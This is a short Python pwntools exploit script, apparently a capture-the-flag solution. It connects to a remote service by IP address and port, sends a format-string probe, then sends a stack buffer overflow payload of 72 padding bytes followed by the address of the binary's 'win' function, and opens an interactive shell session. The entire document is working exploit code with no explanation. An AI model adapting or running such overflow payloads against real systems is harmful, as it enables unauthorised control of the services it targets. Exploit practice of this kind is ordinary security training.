from pwn import * 
p = remote('52.188.108.186',1237)
elf = ELF('./main')
offset = 72
p.sendline('%s')
payload = b"A"*offset + p64(elf.sym.win)
p.sendline(payload)
p.interactive()
